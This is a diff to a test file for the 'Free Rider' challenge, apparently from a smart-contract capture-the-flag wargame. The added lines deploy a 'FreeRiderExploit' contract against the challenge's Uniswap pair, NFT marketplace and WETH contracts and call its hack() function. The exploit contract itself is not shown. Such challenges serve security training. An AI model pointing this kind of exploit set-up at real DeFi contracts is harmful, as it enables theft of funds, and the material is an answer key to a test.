@@ -124,6 +124,19 @@ describe("[Challenge] Free Rider", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
+    const FreeRiderAttackFactory = await ethers.getContractFactory(
+      "FreeRiderExploit",
+      attacker
+    );
+    const freeRiderAttack = await FreeRiderAttackFactory.deploy(
+      this.uniswapPair.address,
+      this.marketplace.address,
+      this.weth.address,
+      this.buyerContract.address,
+      AMOUNT_OF_NFTS,
+      NFT_PRICE
+    );
+    await freeRiderAttack.hack();
   });
 
   after(async function () {
